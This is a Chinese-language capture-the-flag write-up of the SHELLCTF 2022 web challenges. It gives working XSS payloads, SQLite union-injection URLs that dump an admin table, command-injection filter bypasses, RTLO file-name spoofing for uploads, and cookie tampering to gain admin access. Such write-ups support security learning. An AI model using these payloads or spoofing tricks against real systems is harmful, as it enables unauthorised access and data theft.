---
title: SHELLCTF 2022 web writeup
date: 2022-08-13 17:51:00
updated: 2022-08-14 20:45:00
tags: [ctf, security]
description: 一场题目比较脑洞的练手赛
category: CTF
---

## Choosy

> Single solution doesn't works on all problems. One should try different solutions for different problem.
Flag format:- shellctf{H3re_1s_tH3_F14g}
<http://20.125.142.38:8324>
Alternate link <http://20.193.247.209:8333/>

题目只有一个大写转换成小写的功能,不过发现会解析html标签，但是script会被过滤掉，这里可以用img标签，存在XSS注入。

payload：`<img src=x onerror=alert(1)>`，输入后onerror的属性就被改为prompt(flag)了，可能是后台的设置如此。

![图 16](https://s2.loli.net/2022/08/14/xVEU1Ivoe9pjKtw.png)  

## Colour Cookie

> Gone those days when no colours, images, fonts use to be on a webpage. We now have various ways to decorate our webpages and here is one such example.
Flag format :- shellctf{H3re_1s_F14g}
<http://20.125.142.38:8326>
<http://20.193.247.209:8222/>
Hint: The key is finding and Value is the favourite thing....

这是一个很奇怪的题目，解法也和cookie无关，在base_cookie.css里面，中间空了200多行，末尾有一个注释。结合hint,Payload为<http://20.125.142.38:8326/check?C0loR=Blue>

![图 1](https://s2.loli.net/2022/08/14/lgiDfMezRay9rcG.png)  

![图 2](https://s2.loli.net/2022/08/14/CczqAVpfijFymHt.png)  

## Extractor
> We are under emergency. Enemy is ready with its nuclear weapon we need to activate our gaurds but chief who had password is dead. There is portal at URL below which holds key within super-user account, can you get the key and save us.
Flag format :- shellctf{H3re_1s_tH3_fL4G}
<http://20.125.142.38:8956>
Alternate URL :- <http://20.193.247.209:8555/>
More Alternate URL :- <http://52.66.29.74:8999/>

有三个参数的一个登陆功能，考察的是sql注入，过滤了`#`和`\`，猜测sql语句是`select username = '{{username}}' AND pass = '{{pass}}' And content = '{{content}}'`，

```python
# 关于sqlite注入的payload可以查看https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/SQL%20Injection/SQLite%20Injection.md

http://20.125.142.38:8956/profile?username=ek1ng'--+&pass=1&content=1
# 回显账号ek1ng相关内容，判断存在注入点

http://20.125.142.38:8956/profile?username=ek1ng'order by 4--+&pass=1&content=1
# order by 4正常回显，order by 5报错ORDER BY term out of range

http://20.125.142.38:8956/profile?username=ek1ng'union select 1,2,3,sqlite_version()--+&pass=1&content=1
# 通过存在判断出数据库类型为sqlite，版本为3.7.2

http://20.125.142.38:8956/profile?username=ek1ng'union select 1,2,3,sql FROM sqlite_schema--+&pass=1&content=1
# 回显no such table: sqlite_schema
```

根据<https://sqlite.org/forum/forumpost/d90adfbb0a>中提到3.30版本后sqlite_master才改名sqlite_schema,所以应该用sqlite_master。
![图 17](https://s2.loli.net/2022/08/14/7WjcUuZE3iwC4yA.png)  

```python
http://20.125.142.38:8956/profile?username=ek1ng'union select 1,2,3,sql FROM sqlite_master--+&pass=1&content=1
# 结果为CREATE TABLE Admins ( id INTEGER PRIMARY KEY AUTOINCREMENT, user TEXT NOT NULL, pass TEXT NOT NULL, content TEXT NOT NULL )，接下来从Admins表中查询content字段的值即可。

http://20.125.142.38:8956/profile?username=ek1ng'union select 1,2,3,content FROM Admins--+&pass=1&content=1
# shellctf{Sql_1Nj3c7i0n_B45iC_XD}
```

## Illusion

>Sometimes it happens things are there but you can't see it directly. We need to change our vision to make it visible. I believe you have that vision.
Flag format :- shellctf{H3re_1s_Fl4g}
Challenge url :- <http://20.125.142.38:8765/>
Alternate url :- <http://20.193.247.209:8111/>
Flag is in flag.txt file....

考察的点是命令注入，题目对很多字符和字符串存在过滤。

`Hint: "aabcbc".replace("abc","") = abc`

根据hint,可以用双写绕过过滤，之后不断进行尝试就可以啦

![图 4](https://s2.loli.net/2022/08/14/eXinRCBVautpyfQ.png)  

![图 5](https://s2.loli.net/2022/08/14/TXMOU9W51GgshFl.png)  

![图 3](https://s2.loli.net/2022/08/14/4Cf7oFiLU3BEknl.png)  

## More Illusion

If you still not illuded, here is another potion of illusion for you. Can you survive it ?????
Flag format :- enclose entire thing in shellctf{}

- A - Thing you got after solving problem
- B - Linux command (not entire command but specific one command that lead you to solution, ex- "cd .. ; ls -la" was command that showed me thing which lead me to flag then special command is "ls" and argument is "ls")
- C,D,.. - Numbers of arguments use with Linux command (there can be more than one arguments)
Example flag -
- Suppose I got string "H3re_1s_F1ag" from solving so my A = H3re_1s_F1ag
- Suppose I used Linux command "ls" to get string A so my B = ls
- Suppose arguments used were "-la" (ie the special command that help me to get flag was "ls -la") so my C = la
  
So my flag will become :- shellctf{H3re_1s_F1ag_ls_la}
Some charaters are ommited complete the flag with all description above in below flag. ommited character corresponds to arguments of that you du. shellctf{H3re_1s_F1ag_xx_appaxxxx-xxxx_ah}
Challenge url :- <http://20.125.142.38:8499/>
Alternate URL :- <http://52.66.29.74:8871/>
More Alternate URL :- <http://20.193.247.209:8822/>

和前一个题目形式相同，也是需要双写绕过滤。

在当前目录的上级目录下有很多文件夹。这里问题是如何找到真flag所在的目录。

```
❯ du --help
用法：du [选项]... [文件]...
　或：du [选项]... --files0-from=F
统计每个 <文件> 的设备使用量，对于目录则递归地进行处理。
-a, --all             输出所有文件的统计，而不仅仅是目录
      --apparent-size   显示表面使用量，而不是设备使用量；虽然表面使用量通常
                          会小一些，但有时它会因为稀疏文件间的 "洞"、内部碎
                          片、间接块等原因显得更大一些。
-h, --human-readable  以可读性较好的格式输出大小（例如：1K 234M 2G）
    --inodes          列出 inode 使用信息而非块使用信息
```

这里根据题目告知flag格式为`shellctf{H3re_1s_F1ag_xx_appaxxxx-xxxx_ah}`可以想到用命令`du --apparent-size -ah`。不过我之前确实没接触过du这个命令，查了一下是“du” (Disk Usage)，用于统计设备使用量，并且可以递归处理目录。

![图 12](https://s2.loli.net/2022/08/14/ck9JM7CFiuElh5a.png)  

然后这里打印出来形式还是比较乱的，而且有不少flag.txt,整理一下才看得出来真flag,参考了liki4学长的做法，用Cyberchef把HTML实体转换成string,这样会解析换行符号。

![图 13](https://s2.loli.net/2022/08/14/VnXoPZAeMyqOlTp.png)  

找到一条大小为38的flag.txt,应该是真flag。

![图 14](https://s2.loli.net/2022/08/14/R19bsg2OBTnNzrv.png)  

![图 15](https://s2.loli.net/2022/08/14/Fsnl4br7R5Eu6WC.png)  

`shellctf{H0p3_4ny0N3_No7_n071c3_SiZe_D1fF3reNc3_apparent-size_ah}`

## Doc Helper

> Can you share portable document with us which looks like it when we seet portable document with eyes but ti's not actually portable document.
More a misc problem ...
My Favourite move is Inferno overwrite
<http://20.125.142.38:8508>
Alternate Link :- <http://20.193.247.209:8666/>
Hint --- Challenge is all about file extension of the file that you are uploading....
Hint1: Think from right to left
Hint2: Everything is just related to name and extension of file not content in file ...
Hint3: Give me file with name while when seen from eyes look like abc.pdf but its not actually pdf
Hint4: Make file name "abc.fdp" look "abc.pdf"

是一个上传文件的题目，要求上传文件的名字不为pdf,但是能让服务端解析为pdf就给flag。

实现的方法是用控制字符，将fdp从右往左解析为pdf。

![图 18](https://s2.loli.net/2022/08/14/PkvipSc85wgZaRj.png)  

添加`u'202e'`即可。
![图 19](https://s2.loli.net/2022/08/14/gTiejLnWBSxqGKk.png)  

```python
import requests

url = "http://20.193.247.209:8666"
pool = [u'\u200f', u'\u202b', u'\u202e', u'\u2067']
for f in pool:
    filename = "abc."+f+"fdp"
    files = {
        "file": (filename, "xxx", "application/pdf")
    }
    res = requests.post(url, files=files)
    print(filename, len(res.text))
    if len(res.text) != 1331:
        print("success", res.text)
```

## RAW Agent

>Day By Day Pollution is increasing, passing polluted environment and sum of all generation till now will take you to ultimate end.
Flag Format :- Enclose everything in shellctf{} Flag have two part :- shellctf{part1part2}
Part 1 start with :- U
Part 2 start with :- _p
Challenge url :- <http://20.125.142.38:8525/>
Alternate URL :- <http://20.193.247.209:8777/>
More Alternate URL :- <http://52.66.29.74:8888/>

这个题目感觉就很Misc

首先是告知flag分成两部分，第一部分按要求修改http请求头就可以获得。
![图 20](https://s2.loli.net/2022/08/14/lMjVqNzIs126JR7.png)
这个编码在<https://121.43.153.228/index.php/2020/04/18/32.html>中有提到，这个编码只有大写，因此part1为`USSERAGENT`
![图 21](https://s2.loli.net/2022/08/14/oLhjziwO5u29P6V.png)  

part2在f12中会发现一段brainfuck编码的字符

```
+++++++++----------<<<<<<<<<<<<<<]}}]<<<<<<+++++++++
++++++++++[>+>+++>+++++++>++++++++++<<<<-]>>>++++++++++++.>++++.+++++++++++++++++.<++++++++++++++++++.>----------.-.<<++.>----------------.>+.--------.--.+++++++++++.-------.<<.>-------.>.+++.+++.+++++.-----------.------.<<.>.>--.++.+++++.-------.++++++++++++.+++.<<.>+++++++.>+++++++++.-------.<+++++++++++++.>----.++++++.--.+++.--------.<<.>-----------------.>++++++.++++++.<++++++++++++++++++++.>----.<-.++++++++.<.>------------------------------.>----------------.++++++++++++++++++.---.+++.--------.<<.>+++.>--------------.++.+++++.+.+++++++++.---------.++++++++++.++.<<.>---------------.>---------.++++++++.-------------------.+++++++++++++++++.---------.--------.<<.>++++++++++++.>.++++++.+++++++.---------.+++++++++++++++++++++.-----------.-.---------.<<.>+++.<+++++++++++++++++.>>++++++.<<+++.>>--------.<--------.>++++++++++++++++++.<<--------------------.>----.>------------.--------.+++++++++++.-----.------.<<.>+++.>++++++++++++++++++++++++.------------------------.+++++++++++++++++.-----------------.+++.+++++++++++.++++.<<.>---.>-.-----------------.++++++.++++++++.-.-----.+++++++++++.---------------.<<.>+.>.+++++++++++++++++.-----------------..<<.>+++++++.>++++++++++++++++.------------------.<<++++++++++++++++++++.>>+++++++++++++++.<<---.-.----------------.>--------.>-------------.++++++++++.+++++++++.+.------.<<.>++++++++++++++++++++++.+++++++.>---.<+++.>-.++++.<<.>---------------------------------.>-----------.<---------------.>++++++++++.<---.>++++++++.<++++++++++++++++.>--------.<+++.<.>++++++++++++++.>---.+++++.-----.--.<<.>-----------.>------------.+++++++++++++++++.--------------.+.+++++++++++++++++.-------.------.+++++++++.<<.>++++++++++++++.>----.---.+++.<<++++++++++++++++.>++.>.<<----------------.>----------------.<++++++++++++++++.>>----------.++++++++++++++++++++++.<<+.>>--------------.<+++++.<+++.--------------------.>-------.>.-------.--.+++++++++++++++++.--.---.-----------.+.<<.>.>++++++++++++++.----------------.--.+++++++++++++++++++++.---------------------.+++++++++++.---.----.+++++++++++++.<<.>++.>-----------------.+++++++++++++++++.---------------.+++++.+++++++.--.+++.<<.>+++++++++++++++++++.>+++++++++.<+++++++++++++.------.>-------.<+++.+.<.++++++++++++++++++++++++++++++++++.>>------.<----.>++++++++++++++.<++++++++.++.------.+++++++++.<<++++++++++++++++++++++.>+++++.>++++.-------------.+++++++++.-----.+++++.----.---------.
```

解码后为

```
Rhydon Togepi Milotic Machamp Tyrantrum Psyduck Mewtwo Pachirisu Altaria Magnezone P1k4cHu Dialga Gyarados Dragonite Eevee Luc4r10 Deoxys Zapdos Ch4r1zArD Rotom Gardevoir Unkn0Wn G0dz1lL4 Electrode Escavalier Garchomp Zygarde Blaziken Greninja
````

另外默认设置的cookie`77686f616d5f695f616d=55736572`是Hex编码的，转成字符串后是`whoam_i_am=User`，修改为Admin也就是`77686f616d5f695f616d=41646d696e`后会得到一张图片。

不过我这个图床一张图片最大只能5MB,这个超出了就只能截个图了。

![图 1](https://s2.loli.net/2022/08/14/n9wU18XguvR6Py3.png)  

![图 2](https://s2.loli.net/2022/08/14/v5at6xAG9Fk84oK.png)  

图片中存在LSB隐写，需要补俩等号

![图 3](https://s2.loli.net/2022/08/14/ITzH5pOFjsJVutY.png)  

是带密码的7z文件，密码为之前brainfuck解码出来的名字里`Luc4r10`，解压得到part2`_p4raM37eR_P0llu7iOn`。

`shellctf{USSERAGENT_p4raM37eR_P0llu7iOn}`
